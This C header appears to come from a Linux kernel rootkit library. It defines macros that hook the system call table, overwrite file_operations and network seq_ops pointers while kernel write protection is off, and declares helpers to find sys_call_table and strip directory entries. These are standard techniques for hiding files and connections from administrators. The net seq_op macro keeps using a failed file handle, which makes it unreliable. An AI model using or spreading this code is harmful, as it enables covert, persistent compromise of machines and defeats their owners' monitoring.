/*
Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/


# ifndef _GU_ZHENGXIONG_LIB_H
# define _GU_ZHENGXIONG_LIB_H


# include "structs.h"
# include "printk.h"


# define HOOK_SYS_CALL_TABLE(name)                          \
    do {                                                    \
        real_##name = (void *)sys_call_table[__NR_##name];  \
        sys_call_table[__NR_##name] = (void *)fake_##name;  \
    } while (0)

# define UNHOOK_SYS_CALL_TABLE(name)                    \
    sys_call_table[__NR_##name] = (void *)real_##name


# define set_file_op(op, path, new, old)                            \
    do {                                                            \
        struct file *filp;                                          \
        struct file_operations *f_op;                               \
                                                                    \
        fm_alert("Opening the path: %s.\n", path);                  \
        filp = filp_open(path, O_RDONLY, 0);                        \
        if (IS_ERR(filp)) {                                         \
            fm_alert("Failed to open %s with error %ld.\n",         \
                     path, PTR_ERR(filp));                          \
            old = NULL;                                             \
        } else {                                                    \
            fm_alert("Succeeded in opening: %s\n", path);           \
            f_op = (struct file_operations *)filp->f_op;            \
            old = f_op->op;                                         \
                                                                    \
            fm_alert("Changing file_op->" #op " from %p to %p.\n",  \
                     old, new);                                     \
            disable_write_protection();                             \
            f_op->op = new;                                         \
            enable_write_protection();                              \
        }                                                           \
    } while(0)

# define set_net_seq_op(op, path, afinfo_struct, new, old)  \
    do {                                                    \
        struct file *filp;                                  \
        afinfo_struct *afinfo;                              \
                                                            \
        filp = filp_open(path, O_RDONLY, 0);                \
        if (IS_ERR(filp)) {                                 \
            fm_alert("Failed to open %s with error %ld.\n", \
                     path, PTR_ERR(filp));                  \
            old = NULL;                                     \
        }                                                   \
                                                            \
        afinfo = PDE_DATA(filp->f_path.dentry->d_inode);    \
        old = afinfo->seq_ops.op;                           \
        fm_alert("Setting seq_op->" #op " from %p to %p.",  \
                 old, new);                                 \
        afinfo->seq_ops.op = new;                           \
                                                            \
        filp_close(filp, 0);                                \
    } while (0)


unsigned long **
get_sys_call_table(void);


void
disable_write_protection(void);
void
enable_write_protection(void);


char *
join_strings(const char *const *strings, const char *delim,
             char *buff, size_t count);


void
print_memory(void *addr, size_t count, const char *prompt);


void
print_dirent(struct linux_dirent *dirp, long total);
long
remove_dirent_entry(char *name,
                    struct linux_dirent *dirp, long total);


# endif // lib.h
